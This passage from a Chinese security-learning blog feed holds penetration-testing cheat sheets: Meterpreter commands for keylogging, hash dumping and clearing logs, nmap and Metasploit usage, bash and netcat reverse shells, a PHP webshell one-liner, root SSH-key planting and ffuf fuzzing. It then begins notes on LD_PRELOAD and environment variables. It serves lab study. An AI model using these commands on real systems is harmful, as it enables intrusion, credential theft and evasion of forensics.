id&gt;</code></td><td>窃取可用于给定进程的令牌并模拟该令牌。</td></tr><tr><td><code>drop_token</code></td><td>停止模拟当前令牌。</td></tr><tr><td><code>getsystem</code></td><td>尝试通过多个攻击媒介将权限提升为 SYSTEM 级访问权限。</td></tr><tr><td><code>shell</code></td><td>放入包含所有可用令牌的交互式外壳中。</td></tr><tr><td><code>execute -f &lt;cmd.exe&gt; -i</code></td><td>执行cmd.exe并与之交互。</td></tr><tr><td><code>execute -f &lt;cmd.exe&gt; -i -t</code></td><td>使用所有可用的令牌执行 cmd.exe。</td></tr><tr><td><code>execute -f &lt;cmd.exe&gt; -i -H -t</code></td><td>使用所有可用的令牌执行cmd.exe并使其成为隐藏进程。</td></tr><tr><td><code>rev2self</code></td><td>恢复为用于破坏目标的原始用户。</td></tr><tr><td><code>reg &lt;command&gt;</code></td><td>在目标注册表中进行交互、创建、删除、查询、设置等。</td></tr><tr><td><code>setdesktop &lt;number&gt;</code></td><td>根据登录者切换到其他屏幕。</td></tr><tr><td><code>screenshot</code></td><td>截取目标屏幕的屏幕截图。</td></tr><tr><td><code>upload &lt;filename&gt;</code></td><td>将文件上传到目标。</td></tr><tr><td><code>download &lt;filename&gt;</code></td><td>从目标下载文件。</td></tr><tr><td><code>keyscan_start</code></td><td>开始在远程目标上嗅探击键。</td></tr><tr><td><code>keyscan_dump</code></td><td>转储在目标上捕获的远程密钥。</td></tr><tr><td><code>keyscan_stop</code></td><td>停止在远程目标上嗅探击键。</td></tr><tr><td><code>getprivs</code></td><td>在目标上获得尽可能多的权限。</td></tr><tr><td><code>uictl enable &lt;keyboard/mouse&gt;</code></td><td>控制键盘和&#x2F;或鼠标。</td></tr><tr><td><code>background</code></td><td>在后台运行您当前的 Meterpreter shell。</td></tr><tr><td><code>hashdump</code></td><td>在目标上转储所有哈希。使用嗅探器 加载嗅探器模块。</td></tr><tr><td><code>sniffer_interfaces</code></td><td>列出目标上的可用接口。</td></tr><tr><td><code>sniffer_dump &lt;interfaceID&gt; pcapname</code></td><td>开始在远程目标上嗅探。</td></tr><tr><td><code>sniffer_start &lt;interfaceID&gt; packet-buffer</code></td><td>从特定范围的数据包缓冲区开始嗅探。</td></tr><tr><td><code>sniffer_stats &lt;interfaceID&gt;</code></td><td>从您正在嗅探的界面中获取统计信息。</td></tr><tr><td><code>sniffer_stop &lt;interfaceID&gt;</code></td><td>停止嗅探器。</td></tr><tr><td><code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code></td><td>在远程目标上添加用户。</td></tr><tr><td><code>add_group_user &lt;&quot;Domain Admins&quot;&gt; &lt;username&gt; -h &lt;ip&gt;</code></td><td>将用户名添加到远程目标上的域管理员组。</td></tr><tr><td><code>clearev</code></td><td>清除目标计算机上的事件日志。</td></tr><tr><td><code>timestomp</code></td><td>更改文件属性，例如创建日期（反取证度量）。</td></tr><tr><td><code>reboot</code></td><td>重新启动目标计算机。</td></tr></tbody></table><table><thead><tr><th><code>man &lt;tool&gt;</code></th><th>打开指定工具的手册页。</th></tr></thead><tbody><tr><td><code>&lt;tool&gt; -h</code></td><td>打印工具的帮助页。</td></tr><tr><td><code>apropos &lt;keyword&gt;</code></td><td>在手册页的描述中搜索给定关键字的实例。</td></tr><tr><td><code>cat</code></td><td>连接和打印文件。</td></tr><tr><td><code>whoami</code></td><td>显示当前用户名。</td></tr><tr><td><code>id</code></td><td>返回用户标识。</td></tr><tr><td><code>hostname</code></td><td>设置或打印当前主机系统的名称。</td></tr><tr><td><code>uname</code></td><td>打印操作系统名称。</td></tr><tr><td><code>pwd</code></td><td>返回工作目录名称。</td></tr><tr><td><code>ifconfig</code></td><td>该实用程序用于为网络接口分配或查看地址和&#x2F;或配置网络接口参数。<code>ifconfig</code></td></tr><tr><td><code>ip</code></td><td>Ip 是用于显示或操作路由、网络设备、接口和隧道的实用程序。</td></tr><tr><td><code>netstat</code></td><td>显示网络状态。</td></tr><tr><td><code>ss</code></td><td>另一个用于调查套接字的实用程序。</td></tr><tr><td><code>ps</code></td><td>显示进程状态。</td></tr><tr><td><code>who</code></td><td>显示登录者。</td></tr><tr><td><code>env</code></td><td>打印环境或设置并执行命令。</td></tr><tr><td><code>lsblk</code></td><td>列出块设备。</td></tr><tr><td><code>lsusb</code></td><td>列出 USB 设备。</td></tr><tr><td><code>lsof</code></td><td>列出打开的文件。</td></tr><tr><td><code>lspci</code></td><td>列出 PCI 设备。</td></tr><tr><td><code>sudo</code></td><td>以其他用户身份执行命令。</td></tr><tr><td><code>su</code></td><td>该实用程序通过 PAM 请求适当的用户凭证，并切换到该用户 ID（缺省用户是超级用户）。然后执行一个 shell。<code>su</code></td></tr><tr><td><code>useradd</code></td><td>创建新用户或更新默认新用户信息。</td></tr><tr><td><code>userdel</code></td><td>删除用户帐户和相关文件。</td></tr><tr><td><code>usermod</code></td><td>修改用户帐户。</td></tr><tr><td><code>addgroup</code></td><td>将组添加到系统。</td></tr><tr><td><code>delgroup</code></td><td>从系统中删除组。</td></tr><tr><td><code>passwd</code></td><td>更改用户密码。</td></tr><tr><td><code>dpkg</code></td><td>安装、删除和配置基于 Debian 的软件包。</td></tr><tr><td><code>apt</code></td><td>高级包管理命令行实用工具。</td></tr><tr><td><code>aptitude</code></td><td>的替代项。<code>apt</code></td></tr><tr><td><code>snap</code></td><td>安装、删除和配置快照包。</td></tr><tr><td><code>gem</code></td><td>Ruby 的标准包管理器。</td></tr><tr><td><code>pip</code></td><td>Python 的标准包管理器。</td></tr><tr><td><code>git</code></td><td>版本控制系统命令行实用程序。</td></tr><tr><td><code>systemctl</code></td><td>基于命令行的服务和系统控制管理器。</td></tr><tr><td><code>ps</code></td><td>打印当前进程的快照。</td></tr><tr><td><code>journalctl</code></td><td>查询系统日志。</td></tr><tr><td><code>kill</code></td><td>向进程发送信号。</td></tr><tr><td><code>bg</code></td><td>将进程置于后台。</td></tr><tr><td><code>jobs</code></td><td>列出在后台运行的所有进程。</td></tr><tr><td><code>fg</code></td><td>将进程置于前台。</td></tr><tr><td><code>curl</code></td><td>用于从服务器传输数据或将数据传输到服务器的命令行实用程序。</td></tr><tr><td><code>wget</code></td><td>另一种方法是从FTP或HTTP（s）服务器下载文件。<code>curl</code></td></tr><tr><td><code>python3 -m http.server</code></td><td>在 TCP 端口 3 上启动 Python8000 Web 服务器。</td></tr><tr><td><code>ls</code></td><td>列出目录内容。</td></tr><tr><td><code>cd</code></td><td>更改目录。</td></tr><tr><td><code>clear</code></td><td>清除终端。</td></tr><tr><td><code>touch</code></td><td>创建一个空文件。</td></tr><tr><td><code>mkdir</code></td><td>创建目录。</td></tr><tr><td><code>tree</code></td><td>以递归方式列出目录的内容。</td></tr><tr><td><code>mv</code></td><td>移动或重命名文件或目录。</td></tr><tr><td><code>cp</code></td><td>复制文件或目录。</td></tr><tr><td><code>nano</code></td><td>基于终端的文本编辑器。</td></tr><tr><td><code>which</code></td><td>返回文件或链接的路径。</td></tr><tr><td><code>find</code></td><td>在目录层次结构中搜索文件。</td></tr><tr><td><code>updatedb</code></td><td>更新系统上现有内容的区域设置数据库。</td></tr><tr><td><code>locate</code></td><td>使用区域设置数据库查找系统上的内容。</td></tr><tr><td><code>more</code></td><td>用于读取标准输出或文件的寻呼机。</td></tr><tr><td><code>less</code></td><td>具有更多功能的替代方案。<code>more</code></td></tr><tr><td><code>head</code></td><td>打印 STDOUT 的前十行或文件。</td></tr><tr><td><code>tail</code></td><td>打印 STDOUT 或文件的最后十行。</td></tr><tr><td><code>sort</code></td><td>对 STDOUT 或文件的内容进行排序。</td></tr><tr><td><code>grep</code></td><td>搜索包含给定模式的特定结果。</td></tr><tr><td><code>cut</code></td><td>从文件的每一行中删除节。</td></tr><tr><td><code>tr</code></td><td>替换某些字符。</td></tr><tr><td><code>column</code></td><td>基于命令行的实用工具，用于将其输入格式化为多个列。</td></tr><tr><td><code>awk</code></td><td>模式扫描和处理语言。</td></tr><tr><td><code>sed</code></td><td>用于筛选和转换文本的流编辑器。</td></tr><tr><td><code>wc</code></td><td>打印给定输入的换行符、单词和字节计数。</td></tr><tr><td><code>chmod</code></td><td>更改文件或目录的权限。</td></tr><tr><td><code>chown</code></td><td>更改文件或目录的所有者和组。</td></tr></tbody></table><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><table><thead><tr><th><code>sudo</code></th><th>以其他用户身份执行命令。</th></tr></thead><tbody><tr><td><code>su</code></td><td>该实用程序通过 PAM 请求适当的用户凭证，并切换到该用户 ID（缺省用户是超级用户）。然后执行一个 shell。<code>su</code></td></tr><tr><td><code>useradd</code></td><td>创建新用户或更新默认新用户信息。</td></tr><tr><td><code>userdel</code></td><td>删除用户帐户和相关文件。</td></tr><tr><td><code>usermod</code></td><td>修改用户帐户。</td></tr><tr><td><code>addgroup</code></td><td>将组添加到系统。</td></tr><tr><td><code>delgroup</code></td><td>从系统中删除组。</td></tr><tr><td><code>passwd</code></td><td>更改用户密码。</td></tr></tbody></table><p>###包管理</p><table><thead><tr><th><code>dpkg</code></th><th>这是一个安装、构建、删除和管理 Debian 软件包的工具。主要和更用户友好的前端是能力。<code>dpkg``dpkg</code></th></tr></thead><tbody><tr><td><code>apt</code></td><td>Apt 为包管理系统提供了一个高级命令行界面。</td></tr><tr><td><code>aptitude</code></td><td>Aptitude 是 apt 的替代方法，是包管理器的高级接口。</td></tr><tr><td><code>snap</code></td><td>安装、配置、刷新和删除快照包。Snaps 支持安全分发适用于云、服务器、桌面和物联网的最新应用程序和实用程序。</td></tr><tr><td><code>gem</code></td><td>Gem 是 RubyGems 的前端，Ruby 的标准包管理器。</td></tr><tr><td><code>pip</code></td><td>Pip 是一个 Python 软件包安装程序，推荐用于安装 Debian 存档中不可用的 Python 软件包。它可以与版本控制存储库（目前只有 Git、Mercurial 和 Bazaar 存储库）一起使用，广泛记录输出，并通过在开始安装之前下载所有要求来防止部分安装。</td></tr><tr><td><code>git</code></td><td>Git 是一个快速、可扩展的分布式版本控制系统，具有异常丰富的命令集，既提供高级操作，又提供对内部内容的完全访问。</td></tr></tbody></table><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>常规</strong></td><td></td></tr><tr><td><code>sudo openvpn user.ovpn</code></td><td>连接到虚拟专用网络</td></tr><tr><td><code>ifconfig</code>&#x2F;<code>ip a</code></td><td>显示我们的 IP 地址</td></tr><tr><td><code>netstat -rn</code></td><td>显示可通过 VPN 访问的网络</td></tr><tr><td><code>ssh user@10.10.10.10</code></td><td>通过 SSH 连接到远程服务器</td></tr><tr><td><code>ftp 10.129.42.253</code></td><td>FTP 到远程服务器</td></tr><tr><td><strong>鞘鞘</strong></td><td></td></tr><tr><td><code>tmux</code></td><td>启动 tmux</td></tr><tr><td><code>ctrl+b</code></td><td>TMUX：默认前缀</td></tr><tr><td><code>prefix c</code></td><td>TMUX：新窗口</td></tr><tr><td><code>prefix 1</code></td><td>TMUX：切换到窗口 （<code>1</code>)</td></tr><tr><td><code>prefix shift+%</code></td><td>TMUX：垂直拆分窗格</td></tr><tr><td><code>prefix shift+&quot;</code></td><td>TMUX：水平拆分窗格</td></tr><tr><td><code>prefix -&gt;</code></td><td>TMUX：切换到右窗格</td></tr><tr><td><strong>维姆</strong></td><td></td></tr><tr><td><code>vim file</code></td><td>VIM：使用 VIM 打开<code>file</code></td></tr><tr><td><code>esc+i</code></td><td>VIM：进入模式<code>insert</code></td></tr><tr><td><code>esc</code></td><td>VIM：返回模式<code>normal</code></td></tr><tr><td><code>x</code></td><td>vim：剪切字符</td></tr><tr><td><code>dw</code></td><td>vim：剪切词</td></tr><tr><td><code>dd</code></td><td>vim：切割整条线</td></tr><tr><td><code>yw</code></td><td>vim：复制单词</td></tr><tr><td><code>yy</code></td><td>vim：复制整行</td></tr><tr><td><code>p</code></td><td>vim：粘贴</td></tr><tr><td><code>:1</code></td><td>vim：转到第 1 行。</td></tr><tr><td><code>:w</code></td><td>vim：写入文件“即保存”</td></tr><tr><td><code>:q</code></td><td>vim：退出</td></tr><tr><td><code>:q!</code></td><td>vim：退出而不保存</td></tr><tr><td><code>:wq</code></td><td>vim：写和退出</td></tr></tbody></table><!-- more --><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>服务扫描</strong></td><td></td></tr><tr><td><code>nmap 10.129.42.253</code></td><td>在 IP 上运行 nmap</td></tr><tr><td><code>nmap -sV -sC -p- 10.129.42.253</code></td><td>在 IP 上运行 nmap 脚本扫描</td></tr><tr><td><code>locate scripts/citrix</code></td><td>列出各种可用的 nmap 脚本</td></tr><tr><td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td><td>在 IP 上运行 nmap 脚本</td></tr><tr><td><code>netcat 10.10.10.10 22</code></td><td>抓取开放端口的横幅</td></tr><tr><td><code>smbclient -N -L \\\\10.129.42.253</code></td><td>列出中小企业共享</td></tr><tr><td><code>smbclient \\\\10.129.42.253\\users</code></td><td>连接到 SMB 共享</td></tr><tr><td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td><td>扫描 IP 上的 SNMP</td></tr><tr><td><code>onesixtyone -c dict.txt 10.129.42.254</code></td><td>暴力破解 SNMP 机密字符串</td></tr><tr><td><strong>网络枚举</strong></td><td></td></tr><tr><td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td><td>在网站上运行目录扫描</td></tr><tr><td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td><td>在网站上运行子域扫描</td></tr><tr><td><code>curl -IL https://www.inlanefreight.com</code></td><td>抓取网站横幅</td></tr><tr><td><code>whatweb 10.10.10.121</code></td><td>列出有关 Web 服务器&#x2F;证书的详细信息</td></tr><tr><td><code>curl 10.10.10.121/robots.txt</code></td><td>列出潜在目录<code>robots.txt</code></td></tr><tr><td><code>ctrl+U</code></td><td>查看页面源代码（在火狐中）</td></tr><tr><td><strong>公共漏洞利用</strong></td><td></td></tr><tr><td><code>searchsploit openssh 7.2</code></td><td>搜索 Web 应用程序的公共漏洞</td></tr><tr><td><code>msfconsole</code></td><td>MSF：启动 Metasploit 框架</td></tr><tr><td><code>search exploit eternalblue</code></td><td>MSF：在 MSF 中搜索公共漏洞</td></tr><tr><td><code>use exploit/windows/smb/ms17_010_psexec</code></td><td>MSF：开始使用 MSF 模块</td></tr><tr><td><code>show options</code></td><td>MSF：显示 MSF 模块所需的选项</td></tr><tr><td><code>set RHOSTS 10.10.10.40</code></td><td>MSF：设置 MSF 模块选项的值</td></tr><tr><td><code>check</code></td><td>MSF：测试目标服务器是否易受攻击</td></tr><tr><td><code>exploit</code></td><td>MSF：在目标服务器上运行漏洞易受攻击</td></tr><tr><td><strong>使用外壳</strong></td><td></td></tr><tr><td><code>nc -lvnp 1234</code></td><td>在本地端口上启动侦听器<code>nc</code></td></tr><tr><td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td><td>从远程服务器发送反向外壳</td></tr><tr><td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td><td>&#x2F;bin&#x2F;sh -i 2&gt;&amp;1</td></tr><tr><td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td><td>&#x2F;bin&#x2F;bash -i 2&gt;&amp;1</td></tr><tr><td><code>nc 10.10.10.1 1234</code></td><td>连接到远程服务器上启动的绑定外壳</td></tr><tr><td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td><td>升级外壳 TTY （1）</td></tr><tr><td><code>ctrl+z</code>然后然后是两次<code>stty raw -echo``fg``enter</code></td><td>升级外壳 TTY （2）</td></tr><tr><td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td><td>创建一个 webshell php 文件</td></tr><tr><td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td><td>在上传的 Web 外壳上执行命令</td></tr><tr><td><strong>权限提升</strong></td><td></td></tr><tr><td><code>./linpeas.sh</code></td><td>运行脚本以枚举远程服务器<code>linpeas</code></td></tr><tr><td><code>sudo -l</code></td><td>列出可用权限<code>sudo</code></td></tr><tr><td><code>sudo -u user /bin/echo Hello World!</code></td><td>运行命令<code>sudo</code></td></tr><tr><td><code>sudo su -</code></td><td>切换到根用户（如果我们有权访问<code>sudo su</code>)</td></tr><tr><td><code>sudo su user -</code></td><td>切换到用户（如果我们有权访问<code>sudo su</code>)</td></tr><tr><td><code>ssh-keygen -f key</code></td><td>创建新的 SSH 密钥</td></tr><tr><td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td><td>将生成的公钥添加到用户</td></tr><tr><td><code>ssh root@10.10.10.10 -i key</code></td><td>使用生成的私钥通过 SSH 连接到服务器</td></tr><tr><td><strong>传输文件</strong></td><td></td></tr><tr><td><code>python3 -m http.server 8000</code></td><td>启动本地网络服务器</td></tr><tr><td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td><td>从我们的本地计算机下载远程服务器上的文件</td></tr><tr><td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td><td>从我们的本地计算机下载远程服务器上的文件</td></tr><tr><td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td><td>使用（需要 SSH 访问）将文件传输到远程服务器<code>scp</code></td></tr><tr><td><code>base64 shell -w 0</code></td><td>将文件转换为<code>base64</code></td></tr><tr><td>&#96;echo f0VMR…SNIO…InmDwU</td><td>base64 -d &gt; shell&#96;</td></tr><tr><td><code>md5sum shell</code></td><td>检查文件以确保其转换正确<code>md5sum</code></td></tr></tbody></table><h3 id="备忘录-1"><a href="#备忘录-1" class="headerlink" title="备忘录"></a>备忘录</h3><h4 id="Ffuf"><a href="#Ffuf" class="headerlink" title="Ffuf"></a>Ffuf</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>ffuf -h</code></td><td>ffuf help</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></td><td>Directory Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code></td><td>Extension Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></td><td>Page Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></td><td>Recursive Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code></td><td>Sub-domain Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H &#39;Host: FUZZ.academy.htb&#39; -fs xxx</code></td><td>VHost Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></td><td>Parameter Fuzzing - GET</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td><td>Parameter Fuzzing - POST</td></tr><tr><td><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td><td>Value Fuzzing</td></tr></tbody></table><h4 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td><td>Directory&#x2F;Page Wordlist</td></tr><tr><td><code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code></td><td>Extensions Wordlist</td></tr><tr><td><code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>Domain Wordlist</td></tr><tr><td><code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code></td><td>Parameters Wordlist</td></tr></tbody></table><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>sudo sh -c &#39;echo &quot;SERVER_IP academy.htb&quot; &gt;&gt; /etc/hosts&#39;</code></td><td>Add DNS entry</td></tr><tr><td><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code></td><td>Create Sequence Wordlist</td></tr><tr><td><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;</code></td><td>curl w&#x2F; POST</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境变量</title>
      <link href="/2023/06/11/environment_variable/"/>
      <url>/2023/06/11/environment_variable/</url>
      
        <content type="html"><![CDATA[<h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>参考资料：（侵删）</p><p><a href="https://blog.csdn.net/haoel/article/details/1602108"><strong>警惕UNIX下的LD_PRELOAD环境变量</strong></a></p><p><a href="https://blog.csdn.net/itworld123/article/details/125755603?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167117754716782390528530%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167117754716782390528530&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125755603-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=LD_PRELOAD&spm=1018.2226.3001.4187"><strong>深入分析 LD_PRELOAD</strong></a></p><p>##先了解一下LD_PRELOAD</p><p>LD_PRELOAD 是 Linux&#x2F;Unix 系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），&#x3D;&#x3D;它允许在程序运行前定义优先加载的动态链接库。&#x3D;&#x3D;这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，&#x3D;&#x3D;我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。&#x3D;&#x3D;</p><pre><code>一般来说，程序的链接分为静态链接和动态链接，静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明的，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、发布，对于程序的维护产生了比较大的工作量。</code></pre><span id="more"></span><p>在这里，我们细分一下程序的连接：</p><pre><code>程序的链接可以分为以下三种静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</code></pre><p>&#x3D;&#x3D;<strong>动态链接库的 搜索路径搜索的先后顺序</strong>&#x3D;&#x3D;</p><pre><code>编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；* 环境变量 LD_LIBRARY_PATH 指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；* 配置文件 /etc/ld.so.conf 中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；* 默认的动态库搜索路径 /lib；* 默认的动态库搜索路径 /usr/lib；总结：LD_PRELOAD &gt; LD_LIBRARY_PATH &gt; /etc/ld.so.cache &gt; /lib &gt; /usr/lib</code></pre><p><strong>零散的知识点</strong></p><pre><code>Linux规定动态链接库的文件名规则比如如下：libname.so.x.y.zlib：统一前缀。so：统一后缀。name：库名，如 libstdc++.so.6.0.21 的 name 就是 stdc++。x： 主版本号 。表示库有重大升级，不同主版本号的库之间是不兼容的。如libstdc++.so.6.0.21 的主版本号是 6。y： 次版本号 。表示库的增量升级，如增加一些新的接口。在主版本号相同的情况下， 高的次版本号向后兼容低的次版本号 。如 libstdc++.so.6.0.21 的次版本号是 0 。z： 发布版本号 。表示库的优化、bugfix等。相同的主次版本号，不同的发布版本号的库之间 完全兼容 。如 libstdc++.so.6.0.21 的发布版本号是 21。</code></pre><pre><code>不过可以发现，这里我们要利用的环境变量 LD_PRELOAD 并没有出现在这里的搜索路径之中，反而出现了一个 LD_LIBRARY_PATH，这里关于二者之间的关系和区别在 stackoverflow 上也有大佬讨论，观点也很多，不过在这里我比较认可的是下面这个观点LD_PRELOAD (not LD_PRELOAD_PATH) 是要在任何其他库之前加载的特定库 ( files ) 的列表，无论程序是否需要。LD_LIBRARY_PATH 是在加载无论如何都会加载的库时要搜索的 目录列表。 在 linux 上，您可以阅读 man ld.so 有关这些和其他影响动态链接器的环境变量的更多信息。可见，这里 LD_PRELOAD 甚至超脱于动态链接库的搜索路径先后顺序之外，它可以指定在程序运行前优先加载的动态链接库</code></pre><h2 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h2><p>参考文章：（侵删）</p><p><a href="https://blog.csdn.net/weixin_56916549/article/details/127140089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167117926216800182736496%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167117926216800182736496&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127140089-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&spm=1018.2226.3001.4187">环境变量</a></p><p><a href="https://blog.csdn.net/zzoeey/article/details/77697219?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167101150516782425613659%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167101150516782425613659&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-77697219-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=linux%20env%E5%91%BD%E4%BB%A4&spm=1018.2226.3001.4187">中兴新支点命令篇-环境变量命令</a></p><p>####什么是环境变量</p><blockquote><p>环境变量是指在操作系统中用来指定操作系统运行的一些参数：也就是说，操作系统通过环境变量来找到运行时的一些资源。例如链接的时候帮助链接器找到<a href="https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E5%BA%93&spm=1001.2101.3001.7020">动态库</a>（标准库）或者是执行命令的时候，帮助用户找到命令的位置。</p></blockquote><p>NewStart桌面操作系统中常用的环境变量有 PATH、HOME、LOGNAME等。</p><blockquote><p>l PATH指定命令的搜索路径；</p><p>l HOME 指定的是当前用户主目录；</p><p>l LOGNAME指定的是当前用户的登录名；</p><p>提示：除了以上常见的环境变量，部分应用程序在安装时也需要增加环境变量才能生效，比如Java使用的环境变量：JAVA_HOME 和 CLASSPATH等。</p></blockquote><hr><h2 id="title-环境变量命令date-2023-06-11-23-32-02tags-靶场学习"><a href="#title-环境变量命令date-2023-06-11-23-32-02tags-靶场学习" class="headerlink" title="title: 环境变量命令date: 2023-06-11 23:32:02tags: 靶场学习"></a>title: 环境变量命令<br>date: 2023-06-11 23:32:02<br>tags: 靶场学习</h2><h4 id="环境变量命令"><a href="#环境变量命令" class="headerlink" title="环境变量命令"></a>环境变量命令</h4><blockquote><ul><li><strong>env命令</strong></li></ul><p> 显示所有的环境变量，执行env 命令。</p><ul><li><strong>export命令</strong></li></ul><p>  export 命令用于设置或显示环境变量，在shell 中执行程序时，提供一组环境变量。export 可以新增，修改或删除环境变量，作为后续执行的程序使用。</p><p>  export [-fnp][变量名称]&#x3D;[变量设置值]</p><p>  命令选项：</p><ul><li>-f代表[变量名称]中为函数名称。 </li><li>-n删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中。 </li><li>-p列出所有的shell赋予程序的环境变量。</li></ul><p>  ​</p><p>  export 环境变量名称&#x3D;$[环境变量名称]：[新添加的环境变量的内容]:</p><ul><li><p>如果直接赋值，将直接修改变量</p></li><li><p>按   export 环境变量名称&#x3D;$[环境变量名称]：[新添加的环境变量的内容]   将新值添加到末尾</p><p><img src="https://gitee.com/tanin7/knowledge-point-record/raw/master/%E5%9B%BE%E7%89%87/1.png" alt="233.png"></p></li></ul><p>  ​</p></blockquote><p><strong>path命令</strong></p><pre><code>path 决定了 shell 将到哪些目录中寻找命令或程序，path的值是一系列目录，当用户运行一个程序时，系统会在这些目录下进行搜寻编译链接。PATH=$PATH:&lt;PATH1&gt;:&lt;PATH2&gt;:------:&lt;PATHN&gt;可以用户添加指定的路径，中间用冒号隔开。1．安装一个新的命令在 /usr/local/apache/bin 